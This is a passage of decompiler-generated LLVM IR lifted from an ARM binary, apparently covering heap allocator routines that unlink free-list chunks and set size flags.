  br i1 %v9_10f5c, label %dec_label_pc_10f68, label %dec_label_pc_10f74

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f54
  %v1_10f68 = add i32 %v3_10f60, 8
  %v2_10f68 = inttoptr i32 %v1_10f68 to i32*
  %v3_10f68 = load i32, i32* %v2_10f68, align 4
  store i32 %v3_10f68, i32* %r3.global-to-local, align 4
  %v9_10f6c = icmp eq i32 %v3_10f68, %v0_10f54
  br i1 %v9_10f6c, label %dec_label_pc_10f78, label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f54, %dec_label_pc_10f18, %dec_label_pc_10efc, %dec_label_pc_10f68
  %v0_10f74 = call i32 @function_112c4()
  store i32 %v0_10f74, i32* @r0, align 4
  %v0_10f78.pre = load i32, i32* @ip, align 4
  %v1_10f78.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68, %dec_label_pc_10f74
  %v1_10f78 = phi i32 [ %v3_10f60, %dec_label_pc_10f68 ], [ %v1_10f78.pre, %dec_label_pc_10f74 ]
  %v0_10f78 = phi i32 [ %v3_10f54, %dec_label_pc_10f68 ], [ %v0_10f78.pre, %dec_label_pc_10f74 ]
  %v2_10f78 = add i32 %v1_10f78, 8
  %v3_10f78 = inttoptr i32 %v2_10f78 to i32*
  store i32 %v0_10f78, i32* %v3_10f78, align 4
  %v0_10f7c = load i32, i32* %r2.global-to-local, align 4
  %v1_10f7c = load i32, i32* @ip, align 4
  %v2_10f7c = add i32 %v1_10f7c, 12
  %v3_10f7c = inttoptr i32 %v2_10f7c to i32*
  store i32 %v0_10f7c, i32* %v3_10f7c, align 4
  %v0_10f80 = load i32, i32* %lr.global-to-local, align 4
  %v1_10f80 = load i32, i32* %r5.global-to-local, align 4
  %v2_10f80 = add i32 %v1_10f80, %v0_10f80
  store i32 %v2_10f80, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10f84

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f40.dec_label_pc_10f84_crit_edge, %dec_label_pc_10f78
  %v0_10f88 = phi i32 [ %v0_10f88.pre, %dec_label_pc_10f40.dec_label_pc_10f84_crit_edge ], [ %v2_10f80, %dec_label_pc_10f78 ]
  %v0_10f84 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f84 = add i32 %v0_10f84, 8
  %v2_10f84 = inttoptr i32 %v1_10f84 to i32*
  %v3_10f84 = load i32, i32* %v2_10f84, align 4
  store i32 %v3_10f84, i32* %r2.global-to-local, align 4
  %v1_10f88 = or i32 %v0_10f88, 1
  store i32 %v1_10f88, i32* %r3.global-to-local, align 4
  %v0_10f8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10f8c, i32* %v2_10f84, align 4
  %v0_10f90 = load i32, i32* %r1.global-to-local, align 4
  %v1_10f90 = load i32, i32* %r2.global-to-local, align 4
  %v2_10f90 = add i32 %v1_10f90, 12
  %v3_10f90 = inttoptr i32 %v2_10f90 to i32*
  store i32 %v0_10f90, i32* %v3_10f90, align 4
  %v0_10f94 = load i32, i32* %lr.global-to-local, align 4
  %v1_10f94 = load i32, i32* %r1.global-to-local, align 4
  %v3_10f94 = add i32 %v1_10f94, %v0_10f94
  %v4_10f94 = inttoptr i32 %v3_10f94 to i32*
  store i32 %v0_10f94, i32* %v4_10f94, align 4
  %v0_10f98 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f98 = load i32, i32* %r1.global-to-local, align 4
  %v2_10f98 = add i32 %v1_10f98, 4
  %v3_10f98 = inttoptr i32 %v2_10f98 to i32*
  store i32 %v0_10f98, i32* %v3_10f98, align 4
  %v0_10f9c = load i32, i32* %r2.global-to-local, align 4
  %v1_10f9c = load i32, i32* %r1.global-to-local, align 4
  %v2_10f9c = add i32 %v1_10f9c, 8
  %v3_10f9c = inttoptr i32 %v2_10f9c to i32*
  store i32 %v0_10f9c, i32* %v3_10f9c, align 4
  %v0_10fa0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10fa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10fa0 = add i32 %v1_10fa0, 12
  %v3_10fa0 = inttoptr i32 %v2_10fa0 to i32*
  store i32 %v0_10fa0, i32* %v3_10fa0, align 4
  br label %dec_label_pc_10fb8

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10f30
  %v2_10fa8 = add i32 %v1_10f38, %v0_10fa8
  %v1_10fac = or i32 %v2_10fa8, 1
  store i32 %v1_10fac, i32* %r3.global-to-local, align 4
  %v1_10fb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10fb0 = add i32 %v1_10fb0, 4
  %v3_10fb0 = inttoptr i32 %v2_10fb0 to i32*
  store i32 %v1_10fac, i32* %v3_10fb0, align 4
  %v0_10fb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10fb4 = load i32, i32* @r4, align 4
  %v2_10fb4 = add i32 %v1_10fb4, 44
  %v3_10fb4 = inttoptr i32 %v2_10fb4 to i32*
  store i32 %v0_10fb4, i32* %v3_10fb4, align 4
  br label %dec_label_pc_10fb8

dec_label_pc_10fb8:                               ; preds = %dec_label_pc_10f84, %dec_label_pc_10fa8
  %v0_10fb8 = load i32, i32* %sl.global-to-local, align 4
  %v2_10fb8 = icmp eq i32 %v0_10fb8, 0
  store i32 %v0_10fb8, i32* %r1.global-to-local, align 4
  br i1 %v2_10fb8, label %dec_label_pc_10fc4.loopexit, label %dec_label_pc_10ee0

dec_label_pc_10fc4.loopexit:                      ; preds = %dec_label_pc_10fb8
  %v0_10fc4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_10fc4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10fc4.loopexit, %dec_label_pc_10ed0
  %v1_10fc4 = phi i32 [ %v1_10fc4.pre, %dec_label_pc_10fc4.loopexit ], [ %v1_10fc410, %dec_label_pc_10ed0 ]
  %v0_10fcc = phi i32 [ %v0_10fc4.pre, %dec_label_pc_10fc4.loopexit ], [ %v1_10edc, %dec_label_pc_10ed0 ]
  %v9_10fc4 = icmp eq i32 %v0_10fcc, %v1_10fc4
  br i1 %v9_10fc4, label %dec_label_pc_1103c, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fc4
  %v1_10fcc = add i32 %v0_10fcc, 4
  store i32 %v1_10fcc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ed0

dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge:  ; preds = %dec_label_pc_10fd4.preheader, %dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge
  %v0_10fd4.pre = load i32, i32* @r4, align 4
  %v1_10fd4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_10fd4 = mul i32 %v1_10fd4.pre, 8
  %v5_10fd4 = add i32 %v4_10fd4, %v0_10fd4.pre
  %v1_10fd8 = add i32 %v1_10fd4.pre, 1
  store i32 %v1_10fd8, i32* %r2.global-to-local, align 4
  %v1_10fdc = add i32 %v5_10fd4, 44
  store i32 %v1_10fdc, i32* %r3.global-to-local, align 4
  %v2_10fe4 = add i32 %v5_10fd4, 52
  %v3_10fe4 = inttoptr i32 %v2_10fe4 to i32*
  store i32 %v1_10fdc, i32* %v3_10fe4, align 4
  %v0_10fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fe8 = add i32 %v0_10fe8, 12
  %v3_10fe8 = inttoptr i32 %v2_10fe8 to i32*
  store i32 %v0_10fe8, i32* %v3_10fe8, align 4
  %v7_10fec = icmp sgt i32 %v1_10fd8, 95
  br i1 %v7_10fec, label %dec_label_pc_10ff0, label %dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge
  %v0_10ff0 = load i32, i32* @r4, align 4
  %v1_10ff0 = inttoptr i32 %v0_10ff0 to i32*
  %v2_10ff0 = load i32, i32* %v1_10ff0, align 4
  store i32 %v2_10ff0, i32* %r2.global-to-local, align 4
  %v1_10ff4 = add i32 %v0_10ff0, 864
  %v2_10ff4 = inttoptr i32 %v1_10ff4 to i32*
  %v3_10ff4 = load i32, i32* %v2_10ff4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10ffc = urem i32 %v2_10ff0, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_11004 = or i32 %v3_10ff4, 1
  store i32 %v1_11004, i32* %r1.global-to-local, align 4
  %v1_11008 = or i32 %v1_10ffc, 72
  store i32 %v1_11008, i32* %r2.global-to-local, align 4
  %v1_1100c = add i32 %v0_10ff0, 52
  store i32 %v1_1100c, i32* @ip, align 4
  %v2_11010 = add i32 %v0_10ff0, 840
  %v3_11010 = inttoptr i32 %v2_11010 to i32*
  store i32 0, i32* %v3_11010, align 4
  %v0_11014 = load i32, i32* %r3.global-to-local, align 4
  %v1_11014 = add i32 %v0_11014, 65536
  store i32 %v1_11014, i32* %r3.global-to-local, align 4
  %v0_11018 = load i32, i32* %r0.global-to-local, align 4
  %v1_11018 = load i32, i32* @r4, align 4
  %v2_11018 = add i32 %v1_11018, 836
  %v3_11018 = inttoptr i32 %v2_11018 to i32*
  store i32 %v0_11018, i32* %v3_11018, align 4
  %v0_1101c = load i32, i32* %r0.global-to-local, align 4
  %v1_1101c = load i32, i32* @r4, align 4
  %v2_1101c = add i32 %v1_1101c, 844
  %v3_1101c = inttoptr i32 %v2_1101c to i32*
  store i32 %v0_1101c, i32* %v3_1101c, align 4
  %v1_11020 = load i32, i32* @r4, align 4
  %v2_11020 = add i32 %v1_11020, 852
  %v3_11020 = inttoptr i32 %v2_11020 to i32*
  store i32 %v1_11014, i32* %v3_11020, align 4
  %v1_11024 = load i32, i32* @r4, align 4
  %v2_11024 = add i32 %v1_11024, 864
  %v3_11024 = inttoptr i32 %v2_11024 to i32*
  store i32 %v1_11004, i32* %v3_11024, align 4
  %v1_11028 = load i32, i32* @r4, align 4
  %v2_11028 = inttoptr i32 %v1_11028 to i32*
  store i32 %v1_11008, i32* %v2_11028, align 4
  %v0_1102c = load i32, i32* @ip, align 4
  %v1_1102c = load i32, i32* @r4, align 4
  %v2_1102c = add i32 %v1_1102c, 44
  %v3_1102c = inttoptr i32 %v2_1102c to i32*
  store i32 %v0_1102c, i32* %v3_1102c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_11034 = call i32 @function_11ea0(i32 30, i32 %v1_11004, i32 %v1_11008, i32 %v1_11014)
  store i32 %v4_11034, i32* @r0, align 4
  %v1_11038 = load i32, i32* @r4, align 4
  %v2_11038 = add i32 %v1_11038, 860
  %v3_11038 = inttoptr i32 %v2_11038 to i32*
  store i32 %v4_11034, i32* %v3_11038, align 4
  br label %dec_label_pc_1103c

dec_label_pc_1103c:                               ; preds = %dec_label_pc_10fc4, %dec_label_pc_10ff0
  %v2_11040 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11040, i32* @r4, align 4
  %v1_11044 = load i32, i32* @r0, align 4
  ret i32 %v1_11044

; uselistorder directives
  uselistorder i32 %v0_10ff0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10fe8, { 1, 0 }
  uselistorder i32 %v1_10fcc, { 1, 0 }
  uselistorder i32 %v0_10fb8, { 0, 2, 1 }
  uselistorder i32 %v0_10f94, { 1, 0 }
  uselistorder i32 %v1_10ee4, { 1, 0, 2 }
  uselistorder i32 %v0_10efc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10ebc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder label %dec_label_pc_1103c, { 1, 0 }
  uselistorder label %dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10f84, { 1, 0 }
  uselistorder label %dec_label_pc_10f78, { 1, 0 }
  uselistorder label %dec_label_pc_10f74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10f30, { 1, 0 }
}

define i32 @function_11048() local_unnamed_addr {
dec_label_pc_11048:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_11048 = load i32, i32* @r4, align 4
  %v6_11048 = load i32, i32* @r5, align 4
  %v9_11048 = load i32, i32* @r6, align 4
  %v12_11048 = load i32, i32* @r7, align 4
  %v18_11048 = load i32, i32* @lr, align 4
  %v0_11050 = load i32, i32* @r0, align 4
  store i32 %v0_11050, i32* @r6, align 4
  %v2_11050 = icmp eq i32 %v0_11050, 0
  %v2_11054 = ptrtoint i32* %stack_var_-40 to i32
  store i32 142964, i32* @r7, align 4
  br i1 %v2_11050, label %dec_label_pc_1125c, label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11048
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_11064 = load i32, i32* inttoptr (i32 143036 to i32*), align 4
  store i32 %v4_11064, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_11064, i32* %r2.global-to-local, align 4
  %v4_11070 = load i32, i32* inttoptr (i32 143000 to i32*), align 8
  store i32 %v4_11070, i32* %r1.global-to-local, align 4
  store i32 %v2_11054, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1107c = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 %v4_1107c, i32* %ip.global-to-local, align 4
  store i32 69768, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1107c)
  %v0_11088 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11088, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11090 = load i32, i32* @r7, align 4
  %v2_11090 = add i32 %v0_11090, 16
  %v3_11090 = inttoptr i32 %v2_11090 to i32*
  %v4_11090 = load i32, i32* %v3_11090, align 4
  store i32 %v4_11090, i32* %ip.global-to-local, align 4
  store i32 69788, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11090)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_110a0 = load i32, i32* @r7, align 4
  %v2_110a0 = add i32 %v0_110a0, 32
  %v3_110a0 = inttoptr i32 %v2_110a0 to i32*
  %v4_110a0 = load i32, i32* %v3_110a0, align 4
  store i32 %v4_110a0, i32* @lr, align 4
  %v0_110a4 = load i32, i32* @r6, align 4
  %v1_110a4 = add i32 %v0_110a4, -4
  %v2_110a4 = inttoptr i32 %v1_110a4 to i32*
  %v3_110a4 = load i32, i32* %v2_110a4, align 4
  store i32 %v3_110a4, i32* %r2.global-to-local, align 4
  %v1_110a8 = inttoptr i32 %v4_110a0 to i32*
  %v2_110a8 = load i32, i32* %v1_110a8, align 4
  store i32 %v2_110a8, i32* %r3.global-to-local, align 4
  %v1_110ac = and i32 %v3_110a4, -4
  store i32 %v1_110ac, i32* %ip.global-to-local, align 4
  %v1_110b0 = add i32 %v0_110a4, -8
  store i32 %v1_110b0, i32* @r5, align 4
  store i32 %v1_110b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_110ac, %v2_110a8
  br i1 %tmp, label %dec_label_pc_110e0, label %dec_label_pc_110c0

dec_label_pc_110c0:                               ; preds = %dec_label_pc_11060
  %v1_110c0 = or i32 %v2_110a8, 3
  store i32 %v1_110c0, i32* %r3.global-to-local, align 4
  store i32 %v1_110c0, i32* %v1_110a8, align 4
  %v3_110c4 = load i32, i32* @lr, align 4
  %v4_110c4 = add i32 %v3_110c4, -8
  store i32 %v4_110c4, i32* %lr.global-to-local, align 4
  %v0_110c8 = load i32, i32* %ip.global-to-local, align 4
  %v3_110c8 = udiv i32 %v0_110c8, 8
  store i32 %v3_110c8, i32* %r1.global-to-local, align 4
  %v1_110cc = add i32 %v3_110c4, -4
  store i32 %v1_110cc, i32* %r2.global-to-local, align 4
  %v4_110d0 = mul nuw i32 %v3_110c8, 4
  %v5_110d0 = add i32 %v4_110d0, %v1_110cc
  %v6_110d0 = inttoptr i32 %v5_110d0 to i32*
  %v7_110d0 = load i32, i32* %v6_110d0, align 4
  store i32 %v7_110d0, i32* %r3.global-to-local, align 4
  %v1_110d4 = load i32, i32* @r5, align 4
  %v2_110d4 = add i32 %v1_110d4, 8
  %v3_110d4 = inttoptr i32 %v2_110d4 to i32*
  store i32 %v7_110d0, i32* %v3_110d4, align 4
  %v0_110d8 = load i32, i32* @r5, align 4
  %v1_110d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_110d8 = load i32, i32* %r1.global-to-local, align 4
  %v5_110d8 = mul i32 %v2_110d8, 4
  %v6_110d8 = add i32 %v5_110d8, %v1_110d8
  %v7_110d8 = inttoptr i32 %v6_110d8 to i32*
  store i32 %v0_110d8, i32* %v7_110d8, align 4
  br label %dec_label_pc_11244

dec_label_pc_110e0:                               ; preds = %dec_label_pc_11060
  %v1_110e0 = and i32 %v3_110a4, 2
  %v2_110e0 = icmp eq i32 %v1_110e0, 0
  br i1 %v2_110e0, label %dec_label_pc_110e8, label %dec_label_pc_1121c

dec_label_pc_110e8:                               ; preds = %dec_label_pc_110e0
  %v1_110e8 = or i32 %v2_110a8, 1
  store i32 %v1_110e8, i32* %r3.global-to-local, align 4
  store i32 %v1_110e8, i32* %v1_110a8, align 4
  %v0_110f0 = load i32, i32* @r6, align 4
  %v1_110f0 = add i32 %v0_110f0, -4
  %v2_110f0 = inttoptr i32 %v1_110f0 to i32*
  %v3_110f0 = load i32, i32* %v2_110f0, align 4
  store i32 %v3_110f0, i32* %r3.global-to-local, align 4
  %v0_110f4 = load i32, i32* @r5, align 4
  %v1_110f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_110f4 = add i32 %v1_110f4, %v0_110f4
  store i32 %v2_110f4, i32* %lr.global-to-local, align 4
  %v1_110f8 = urem i32 %v3_110f0, 2
  %v2_110f8 = icmp eq i32 %v1_110f8, 0
  %v1_110fc = add i32 %v2_110f4, 4
  %v2_110fc = inttoptr i32 %v1_110fc to i32*
  %v3_110fc = load i32, i32* %v2_110fc, align 4
  store i32 %v3_110fc, i32* %r8.global-to-local, align 4
  br i1 %v2_110f8, label %dec_label_pc_11104, label %dec_label_pc_11138

dec_label_pc_11104:                               ; preds = %dec_label_pc_110e8
  %v1_11104 = add i32 %v0_110f0, -8
  %v2_11104 = inttoptr i32 %v1_11104 to i32*
  %v3_11104 = load i32, i32* %v2_11104, align 4
  store i32 %v3_11104, i32* %r1.global-to-local, align 4
  %v2_11108 = sub i32 %v0_110f4, %v3_11104
  store i32 %v2_11108, i32* %r3.global-to-local, align 4
  %v1_1110c = add i32 %v2_11108, 8
  %v2_1110c = inttoptr i32 %v1_1110c to i32*
  %v3_1110c = load i32, i32* %v2_1110c, align 4
  store i32 %v3_1110c, i32* %r2.global-to-local, align 4
  %v1_11110 = add i32 %v3_1110c, 12
  %v2_11110 = inttoptr i32 %v1_11110 to i32*
  %v3_11110 = load i32, i32* %v2_11110, align 4
  store i32 %v3_11110, i32* %r4.global-to-local, align 4
  %v9_11114 = icmp eq i32 %v3_11110, %v2_11108
  %v1_11118 = add i32 %v2_11108, 12
  %v2_11118 = inttoptr i32 %v1_11118 to i32*
  %v3_11118 = load i32, i32* %v2_11118, align 4
  store i32 %v3_11118, i32* %r0.global-to-local, align 4
  br i1 %v9_11114, label %dec_label_pc_11120, label %dec_label_pc_11184

dec_label_pc_11120:                               ; preds = %dec_label_pc_11104
  %v1_11120 = add i32 %v3_11118, 8
  %v2_11120 = inttoptr i32 %v1_11120 to i32*
  %v3_11120 = load i32, i32* %v2_11120, align 4
  store i32 %v3_11120, i32* %r3.global-to-local, align 4
  %v9_11124 = icmp eq i32 %v3_11120, %v2_11108
  br i1 %v9_11124, label %dec_label_pc_1112c, label %dec_label_pc_11184

dec_label_pc_1112c:                               ; preds = %dec_label_pc_11120
  store i32 %v3_1110c, i32* %v2_11120, align 4
  %v0_11130 = load i32, i32* %r0.global-to-local, align 4
  %v1_11130 = load i32, i32* %r2.global-to-local, align 4
  %v2_11130 = add i32 %v1_11130, 12
  %v3_11130 = inttoptr i32 %v2_11130 to i32*
  store i32 %v0_11130, i32* %v3_11130, align 4
  %v0_11134 = load i32, i32* %ip.global-to-local, align 4
  %v1_11134 = load i32, i32* %r1.global-to-local, align 4
  %v2_11134 = add i32 %v1_11134, %v0_11134
  store i32 %v2_11134, i32* %ip.global-to-local, align 4
  %v0_11144.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11148.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11138

dec_label_pc_11138:                               ; preds = %dec_label_pc_110e8, %dec_label_pc_1112c
  %v0_111c4 = phi i32 [ %v1_110f4, %dec_label_pc_110e8 ], [ %v2_11134, %dec_label_pc_1112c ]
  %v0_11148 = phi i32 [ %v3_110fc, %dec_label_pc_110e8 ], [ %v0_11148.pre, %dec_label_pc_1112c ]
  %v1_1115c = phi i32 [ %v2_110f4, %dec_label_pc_110e8 ], [ %v0_11144.pre, %dec_label_pc_1112c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1113c = load i32, i32* @r7, align 4
  %v2_1113c = add i32 %v0_1113c, 32
  %v3_1113c = inttoptr i32 %v2_1113c to i32*
  %v4_1113c = load i32, i32* %v3_1113c, align 4
  store i32 %v4_1113c, i32* %r2.global-to-local, align 4
  %v1_11140 = add i32 %v4_1113c, 44
  %v2_11140 = inttoptr i32 %v1_11140 to i32*
  %v3_11140 = load i32, i32* %v2_11140, align 4
  store i32 %v3_11140, i32* %r3.global-to-local, align 4
  %v9_11144 = icmp eq i32 %v1_1115c, %v3_11140
  %v1_11148 = and i32 %v0_11148, -4
  store i32 %v1_11148, i32* %r0.global-to-local, align 4
  br i1 %v9_11144, label %dec_label_pc_111c4, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11138
  %v2_11150 = add i32 %v1_1115c, %v1_11148
  store i32 %v2_11150, i32* %r3.global-to-local, align 4
  %v1_11154 = add i32 %v2_11150, 4
  %v2_11154 = inttoptr i32 %v1_11154 to i32*
  %v3_11154 = load i32, i32* %v2_11154, align 4
  store i32 %v3_11154, i32* %r3.global-to-local, align 4
  %v1_11158 = urem i32 %v3_11154, 2
  %v2_11158 = icmp eq i32 %v1_11158, 0
  %v2_1115c = add i32 %v1_1115c, 4
  %v3_1115c = inttoptr i32 %v2_1115c to i32*
  store i32 %v1_11148, i32* %v3_1115c, align 4
  br i1 %v2_11158, label %dec_label_pc_11164, label %dec_label_pc_11150.dec_label_pc_11194_crit_edge

dec_label_pc_11150.dec_label_pc_11194_crit_edge:  ; preds = %dec_label_pc_11150
  %v0_111a4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11194

dec_label_pc_11164:                               ; preds = %dec_label_pc_11150
  %v0_11164 = load i32, i32* %lr.global-to-local, align 4
  %v1_11164 = add i32 %v0_11164, 8
  %v2_11164 = inttoptr i32 %v1_11164 to i32*
  %v3_11164 = load i32, i32* %v2_11164, align 4
  store i32 %v3_11164, i32* %r1.global-to-local, align 4
  %v1_11168 = add i32 %v3_11164, 12
  %v2_11168 = inttoptr i32 %v1_11168 to i32*
  %v3_11168 = load i32, i32* %v2_11168, align 4
  store i32 %v3_11168, i32* %r3.global-to-local, align 4
  %v9_1116c = icmp eq i32 %v3_11168, %v0_11164
  %v1_11170 = add i32 %v0_11164, 12
  %v2_11170 = inttoptr i32 %v1_11170 to i32*
  %v3_11170 = load i32, i32* %v2_11170, align 4
  store i32 %v3_11170, i32* %r2.global-to-local, align 4
  br i1 %v9_1116c, label %dec_label_pc_11178, label %dec_label_pc_11184

dec_label_pc_11178:                               ; preds = %dec_label_pc_11164
  %v1_11178 = add i32 %v3_11170, 8
  %v2_11178 = inttoptr i32 %v1_11178 to i32*
  %v3_11178 = load i32, i32* %v2_11178, align 4
  store i32 %v3_11178, i32* %r3.global-to-local, align 4
  %v9_1117c = icmp eq i32 %v3_11178, %v0_11164
  br i1 %v9_1117c, label %dec_label_pc_11188, label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_11164, %dec_label_pc_11120, %dec_label_pc_11104, %dec_label_pc_11178
  %v0_11184 = call i32 @function_112c4()
  store i32 %v0_11184, i32* %r0.global-to-local, align 4
  %v0_11188.pre = load i32, i32* @r1, align 4
  %v1_11188.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %dec_label_pc_11178, %dec_label_pc_11184
  %v1_11188 = phi i32 [ %v3_11170, %dec_label_pc_11178 ], [ %v1_11188.pre, %dec_label_pc_11184 ]
  %v0_11188 = phi i32 [ %v3_11164, %dec_label_pc_11178 ], [ %v0_11188.pre, %dec_label_pc_11184 ]
  %v2_11188 = add i32 %v1_11188, 8
  %v3_11188 = inttoptr i32 %v2_11188 to i32*
  store i32 %v0_11188, i32* %v3_11188, align 4
  %v0_1118c = load i32, i32* %r2.global-to-local, align 4
  %v1_1118c = load i32, i32* %r1.global-to-local, align 4
  %v2_1118c = add i32 %v1_1118c, 12
  %v3_1118c = inttoptr i32 %v2_1118c to i32*
  store i32 %v0_1118c, i32* %v3_1118c, align 4
  %v0_11190 = load i32, i32* %ip.global-to-local, align 4
  %v1_11190 = load i32, i32* %r0.global-to-local, align 4
  %v2_11190 = add i32 %v1_11190, %v0_11190
  store i32 %v2_11190, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_11150.dec_label_pc_11194_crit_edge, %dec_label_pc_11188
  %v0_111a4 = phi i32 [ %v0_111a4.pre, %dec_label_pc_11150.dec_label_pc_11194_crit_edge ], [ %v2_11190, %dec_label_pc_11188 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_11198 = load i32, i32* @r7, align 4
  %v2_11198 = add i32 %v0_11198, 32
  %v3_11198 = inttoptr i32 %v2_11198 to i32*
  %v4_11198 = load i32, i32* %v3_11198, align 4
  %v1_1119c = add i32 %v4_11198, 52
  store i32 %v1_1119c, i32* %r3.global-to-local, align 4
  %v1_111a0 = add i32 %v4_11198, 60
  %v2_111a0 = inttoptr i32 %v1_111a0 to i32*
  %v3_111a0 = load i32, i32* %v2_111a0, align 4
  store i32 %v3_111a0, i32* %r1.global-to-local, align 4
  %v1_111a4 = or i32 %v0_111a4, 1
  store i32 %v1_111a4, i32* %r2.global-to-local, align 4
  %v1_111a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_111a8 = add i32 %v1_111a8, 12
  %v3_111a8 = inttoptr i32 %v2_111a8 to i32*
  store i32 %v1_1119c, i32* %v3_111a8, align 4
  %v0_111ac = load i32, i32* %r1.global-to-local, align 4
  %v1_111ac = load i32, i32* %r4.global-to-local, align 4
  %v2_111ac = add i32 %v1_111ac, 8
  %v3_111ac = inttoptr i32 %v2_111ac to i32*
  store i32 %v0_111ac, i32* %v3_111ac, align 4
  %v0_111b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_111b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_111b0 = add i32 %v1_111b0, 4
  %v3_111b0 = inttoptr i32 %v2_111b0 to i32*
  store i32 %v0_111b0, i32* %v3_111b0, align 4
  %v0_111b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_111b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_111b4 = add i32 %v1_111b4, %v0_111b4
  %v4_111b4 = inttoptr i32 %v3_111b4 to i32*
  store i32 %v0_111b4, i32* %v4_111b4, align 4
  %v0_111b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_111b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_111b8 = add i32 %v1_111b8, 12
  %v3_111b8 = inttoptr i32 %v2_111b8 to i32*
  store i32 %v0_111b8, i32* %v3_111b8, align 4
  %v0_111bc = load i32, i32* %r4.global-to-local, align 4
  %v1_111bc = load i32, i32* %r3.global-to-local, align 4
  %v2_111bc = add i32 %v1_111bc, 8
  %v3_111bc = inttoptr i32 %v2_111bc to i32*
  store i32 %v0_111bc, i32* %v3_111bc, align 4
  br label %dec_label_pc_111d4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_11138
  %v2_111c4 = add i32 %v1_11148, %v0_111c4
  store i32 %v2_111c4, i32* %ip.global-to-local, align 4
  %v1_111c8 = or i32 %v2_111c4, 1
  store i32 %v1_111c8, i32* %r3.global-to-local, align 4
  %v0_111cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_111cc, i32* %v2_11140, align 4
  %v0_111d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_111d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_111d0 = add i32 %v1_111d0, 4
  %v3_111d0 = inttoptr i32 %v2_111d0 to i32*
  store i32 %v0_111d0, i32* %v3_111d0, align 4
